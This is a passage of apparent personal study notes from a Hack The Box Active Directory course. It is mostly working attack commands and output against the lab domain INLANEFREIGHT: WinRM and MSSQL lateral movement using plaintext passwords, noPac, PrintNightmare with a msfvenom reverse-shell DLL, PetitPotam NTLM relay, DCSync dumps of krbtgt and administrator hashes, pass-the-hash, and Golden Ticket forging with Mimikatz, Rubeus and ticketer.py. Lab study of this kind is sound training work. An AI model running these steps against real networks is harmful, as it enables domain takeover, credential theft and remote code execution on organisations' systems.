  Hash NTLM: 88ad09182de639ccc6579eb0849751cf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4625fd0c31368ff4c255a3b876eaac3d
```

## **Stacking The Deck**

## **Privileged Access**

#### **Enumerating the Remote Desktop Users Group**

* `PS C:\htb> Import-Module .\PowerView.ps1`
* `PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`

In bloodhound, for a specific user (whose foothold we have) check for what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 10.png>)

We can see wley is member of domain user and can rdp into academy…

### **WinRM**

Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts.

We can use this cypher query in bloodhound to hunt for users with Remote Management access

* `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2`

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 11.png>)

We can establish Winrm session from windows as

```powershell
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred[ACADEMY-EA-DB01]: 

PS C:\Users\forend\Documents> hostname
ACADEMY-EA-DB01
[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb>
```

Alternatively we can use Evil-WinRM from linux as

* `dollarboysushil@htb[/htb]**$** evil-winrm -i 10.129.201.234 -u forend`

## **SQL Server Admin**

Cypher query to hunt for users with SQLAdmin rights

* `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2`

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 12.png>)

#### **Enumerating MSSQL Instances with PowerUpSQL**

```powershell
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

```powershell
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

From linux using `mssqlclient.py`

* `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`

then we can run os command using

* `SQL> enable_xp_cmdshell`
* `SQL>` `xp_cmdshell whoami /priv`

## **Kerberos "Double Hop" Problem**

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 13.png>)

The Kerberos "double hop" problem arises in scenarios where authentication is required across multiple servers or services. For example, when a user logs into Server A and then Server A needs to access Server B on behalf of the user, traditional Kerberos authentication fails because the user's credentials cannot be passed from Server A to Server B. This problem is typically encountered in web applications, remote desktop services, and distributed computing environments.

## **Workaround #1: PSCredential Object**

* `*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1`
* `get-domainuser -spn` this will give us error because we cannot pass our authentication on to the Domain Controller to query for the SPN account

If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x57f8a

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL

    Server: academy-aen-ms0$ @
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
    Start Time: 6/28/2022 7:31:53 (local)
    End Time:   6/28/2022 7:46:53 (local)
    Renew Time: 7/5/2022 7:31:18 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U
    Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

So now, let's set up a PSCredential object and try again. First, we set up our authentication.

* `*Evil-WinRM* PS C:\Users\backupadm\Documents>$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force`
* `Evil-WinRM* PS C:\Users\backupadm\Documents> **$**Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)`

Now when we try to query for the SPN account while passing our credential along, our cmd will be successfull

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
```

if we again try without `-credential` flag then, we will get the same error.

IF we RDP to the same host, open CMD and type `klist` we will see necessary tickets cached directly with the DC, and no problem of double hop problem.

```
C:\htb> klist

Current LogonId is 0:0x1e5b8b

Cached Tickets: (4)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#1>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#2>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: ProtectedStorage/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#3>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

## **Workaround #2: Register PSSession Configuration**

Let's start by first establishing a WinRM session on the remote host.

* `PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm`

now when we run `klist` we will get the same error

```powershell
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x11e387

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40a10000 -
```

One trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.

```powershell
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

 WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
 a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows
PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has
recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be
 required.
All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session
configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.

   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin
```

Once this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.

```powershell
PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
[DEV01]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x2239ba

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
       Start Time: 6/28/2022 13:24:37 (local)
       End Time:   6/28/2022 23:24:37 (local)
       Renew Time: 7/5/2022 13:24:37 (local)
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x1 -> PRIMARY
       Kdc Called: DC01
```

## **Bleeding Edge Vulnerabilities**

## **NoPac (SamAccountName Spoofing)**

CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287),&#x20;

**By default, every authenticated user can add up to ten computers to the Domain. The following steps explain how to perform this attack.**

* Create a new account in Active Directory with a random name and then rename it to one of the Domain Controllers without the trailing “$” symbol.
* Request a Kerberos ticket for the created account. Once the ticket is granted, change the name of the account created back to its original name (i.e., the random name chosen in the first step).
* Use the ticket to request an access token from the TGS for a specific service. Because of the absence of an account with that name, the TGS chooses the closest match and appends a “$” symbol. In this way, access to the service is granted with Domain Controller privileges.

another explaination

authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain). When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.&#x20;

Exploit

* Make sure we have impacket installed in our attacking linux
* then install Nopac exploit repo [https://github.com/Ridter/noPac](https://github.com/Ridter/noPac)
* `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` → checking if target is vulnerable
* `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` → executing the exploit to get shell.

#### **Using noPac to DCSync the Built-in Administrator Account**

* `dollarboysushil@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`

## **PrintNightmare**

[CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) found in the print spooler service.

Exploit to use: `https://github.com/cube0x0/CVE-2021-1675.git` developed by `cube0x0`

For this exploit to run, we need to use cube0x0’s version of impacket which can be achieved as;

```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

* `dollarboysushil@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'` → enumerating for ms-rprn
* `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll` → crafting dll payload
* `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll` → creating SMB share using smbserver.py
* then start msf multi/handler
  * use explit/multi/handler set payload windows/x64/meterpreter/reverse\_tcp set lhost, set lport and run
* `sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'` → running the shell.

## **PetitPotam (MS-EFSRPC)**

[CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) allows unauthenticated attacker to coerce a DC to authenticate against another host using NTLM over the port 445

*   `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`

    starting ntlmrelay
*   `dollarboysushil@htb[/htb]**$** python3 PetitPotam.py 172.16.5.225 172.16.5.5`

    running [petitpotam.py](http://petitpotam.py) with attackerhost IP and DC ip to force DC to authenticate to our host when nrlmrelayx is running.

In our ntlmrelay running tab, we will see successfull login request and base64 encoded certificate for the domain controller.

Using the base64 certificate, we can use [gettgtpkinit.py](http://gettgtpkinit.py) tool to request TGT for the domain controller.

*   `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache`

    The TGT will be saved to dc01.ccache file. lets set the KRBCCNAME env variable to that ccache
* `dollarboysushil@htb[/htb]**$** export KRB5CCNAME=dc01.ccache`

Using DC TGT lets do DCSync

*   `dollarboysushil@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`

    this will give us the NTLM hash

#### **Confirming Admin Access to the Domain Controller**

* `dollarboysushil@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf`

## **Miscellaneous Misconfigurations**

## **Enumerating DNS Records**

We can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account.

*   `dollarboysushil@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`

    we can use `-r` flag to resolve unknown records

    data will be saved in `records.csv`

## **ASREPRoasting**

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled.

First , search for account with Donot\_req\_preauth

* `PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl`
* `PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` or using kerbrute
* `dollarboysushil@htb[/htb]**$** kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`

| Command                                                           | Description                                                                                                                                          |
| ----------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| Import-Module .\SecurityAssessment.ps1                            | Used to import the module Security Assessment.ps1. Performed from a Windows-based host.                                                              |
| Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL | SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.                    |
| adidnsdump -u inlanefreight\forend ldap://172.16.5.5              | Used to resolve all records in a DNS zone over LDAP from a Linux-based host.                                                                         |
| adidnsdump -u inlanefreight\forend ldap://172.16.5.5 -r           | Used to resolve unknown records in a DNS zone by performing an A query (-r) from a Linux-based host.                                                 |
| Get-DomainUser \*                                                 | Select-Object samaccountname,description                                                                                                             |
| Get-DomainUser -UACFilter PASSWD\_NOTREQD                         | Select-Object samaccountname,useraccountcontrol                                                                                                      |
| ls \academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts            | Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host. |

## Why So Trusting? (Golden Ticket)

## Domain Trusts Primer

A [trust](https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx) is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides.&#x20;

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 14.png>)

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 15.png>)

## **Enumerating Trust Relationships**

```powershell
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

## Using Powerview

```powershell
PS C:\htb> Import-Moduel .\powerview.ps1
PS C:\htb> Get-DomainTrust

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM
```

We can also use BloodHound to visualize these trust relationships by using the `Map Domain Trusts` pre-built query. Here we can easily see that two bidirectional trusts exist.

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 16.png>)

## **Attacking Domain Trusts - Child -> Parent Trusts - from Windows**

The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.

## **ExtraSids Attack - Mimikatz**

#### **Obtaining the KRBTGT Account's NT Hash using Mimikatz**

`KRBTGT` is a service account for the KDC in AD.

* `PS C:\htb> mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`

```powershell
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e
```

We can use the PowerView `Get-DomainSID` function to get the SID for the child domain,

```powershell
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain.

```powershell
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

At this point, we have gathered the following data points:

* The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
* The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
* The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`
* The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
* The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

Currently we donot have access

* `PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$`

#### **Creating a Golden Ticket with Mimikatz**

```powershell
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

we can confirm a kerberos ticket is in memory using `klist` command

Now running this command, we have access.`PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$`

* `ls \\academy-ea-dc01.inlanefreight.local\c$` → listing the entire C: Drive of the Domain Controller

## **ExtraSids Attack - Rubeus**

* `PS C:\htb> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt` →creating golden ticket using Rubeus
* `klist` to confirm ticket is in Memory

### **Performing a DCSync Attack against `lab_adm` domain user**

```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

## **Attacking Domain Trusts - Child -> Parent Trusts - from Linux**

#### **Performing DCSync with secretsdump.py**

```
dollarboysushil@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

#### **Performing SID Brute Forcing using lookupsid.py**

* `dollarboysushil@htb[/htb]**$** lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`
* `dollarboysushil@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"` → filtering out just the DOMAIN SID

#### **Grabbing the Domain SID & Attaching to Enterprise Admin's RID**

* `dollarboysushil@htb[/htb]**$** lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`
* The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f` → from DCSync using secretsdump.py
* The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689` → from lookupsid.py
* The name of a target user in the child domain (does not need to exist!): `hacker`
* The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
* The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`→ from lookupsid.py

## **Constructing a Golden Ticket using ticketer.py**

```
dollarboysushil@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in hacker.ccache
```

ticket will be saved in .ccache, we have to setup a `KRB5CCNAME` Environment Variable

* `export KRB5CCNAME=hacker.ccache`
* `dollarboysushil@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5` → getting System shell using impacket’s psexec

Impacket also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain.

* `dollarboysushil@htb[/htb]**$** raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`

## **Breaking Down Boundaries**

## **Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows**

#### **Enumerating Accounts for Associated SPNs Using Get-DomainUser Using Power view**

```powershell
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
